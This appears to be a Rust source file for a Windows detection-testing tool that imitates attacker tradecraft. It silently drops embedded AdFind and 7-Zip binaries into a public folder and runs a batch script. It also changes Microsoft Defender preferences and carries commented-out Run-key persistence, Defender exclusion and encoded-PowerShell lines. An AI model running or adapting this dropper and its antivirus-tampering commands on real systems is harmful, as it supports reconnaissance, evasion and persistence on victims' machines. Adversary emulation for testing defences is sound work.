#![windows_subsystem = "windows"]

//not find better for now :)
#![allow(unused_imports)]
#![allow(dead_code)]

use std::env;
use std::path::PathBuf;
use std::process::Command;

extern crate winreg;
use winreg::HKEY;
use winreg::RegKey;
use winreg::enums::*;

use std::fs::File;
use std::io::Write;

mod tools {

    use RegKey;
    use HKEY;
    use Command;

    /*
    Execute an executable with a commandline
    */
    pub fn run_exe(executable: &str,commandline: &str) {
        let mut child = Command::new(executable)
            .args([commandline])
            .spawn()
            .expect("failed to execute process");
        let _ecode = child.wait().expect("failed to wait on child");
    }

    /*
    Execute an executable with a reverse commandline 
    */
    pub fn run_exe_reverse(executable: &str,commandline: &str) {
        let commandline_reversed: String = commandline.chars().rev().collect();
        let mut child = Command::new(executable)
            .args([commandline_reversed])
            .spawn()
            .expect("failed to execute process");
        let _ecode = child.wait().expect("failed to wait on child");
    }
    
    /* learn how use generic type for value */
    pub fn set_reg_str(root: HKEY, regpath: &str,name: &str, value: &str){
        let base = winreg::RegKey::predef(root);
        let rootkey = base.create_subkey(regpath);
        match rootkey{
            Ok(subkey) => {
                let _set_result = subkey.0.set_value(name, &value);
            },
            Err(_) => return(),
        }
   }
   pub fn set_reg_u32(root: HKEY, regpath: &str,name: &str, value: u32){
    let base = winreg::RegKey::predef(root);
    let rootkey = base.create_subkey(regpath);
    match rootkey{
        Ok(subkey) => {
            let _set_result = subkey.0.set_value(name, &value);
        },
        Err(_) => return(),
    }
}


    pub fn spawn(exe_path: &str){
        let exe_in = std::env::current_exe().unwrap();
        // set new
        let exe_out = std::path::PathBuf::from(exe_path);
        // create all the missing folder
        let create_path_result = std::fs::create_dir_all(exe_out.clone().parent().unwrap());
    
        match create_path_result{
            Err(_) => {},
            Ok(_) => {
                let create_path_result = std::fs::copy(exe_in, exe_out.clone());
                match create_path_result{
                    Err(_) => {},
                    Ok(_) => {
                        let _child = Command::new(exe_path)
                            .spawn()
                            .expect("failed to execute process");
                        std::process::exit(0);
                    }
                }
            }
        }
    }

}

   /* tools::set_reg_str(HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "rustmydetection",
        "\"c:\\git\\rustmydetection.exe\"");
    */ 
    //"powershell" -Command Add-MpPreference -ExclusionPath 'C:\ProgramData' 
    //ps_enc("cwB0AGEAcgB0AC0AcwBsAGUAZQBwACAALQBzAGUAYwBvAG4AZABzACAAMgAwAA=="); //wait 20
    




fn main() {
    let dropzone = r"C:\Users\Public\Downloads\";

    //Adfind tools
    let adfind_bin = include_bytes!("payload/AdFind.bin");
    let adfind_cmd = include_str!("payload/adfind.cmd");
    
    //7zip
    let  sevenzip_a = include_bytes!("payload/7zip/7za.dll");
    let  sevenzip_xa = include_bytes!("payload/7zip/7zxa.dll");
    let  sevenzip_exe = include_bytes!("payload/7zip/7za.exe");

    // exclude exe from defender
    tools::run_exe("powershell", "Remove-MpPreference -ExclusionExtension .exe");
    
    //let make a scope to close the file :)
    {
        File::create(format!("{}{}",dropzone,"find.exe")).expect("Oups").write_all(adfind_bin).unwrap();
        File::create(format!("{}{}",dropzone,"check.cmd")).expect("Oups").write_all( adfind_cmd.as_bytes()).unwrap();
        File::create(format!("{}{}",dropzone,"7za.dll")).expect("Oups").write_all(sevenzip_a).unwrap();
        File::create(format!("{}{}",dropzone,"7zxa.dll")).expect("Oups").write_all(sevenzip_xa).unwrap();
        File::create(format!("{}{}",dropzone,"7za.exe")).expect("Oups").write_all(sevenzip_exe).unwrap();
    }

    //    tools::run_exe("cmd", &format!("/C {}{}",dropzone,"check.cmd"))
    Command::new("cmd").current_dir(dropzone).args(["/C","check.cmd"]).spawn().expect("Oups");

}
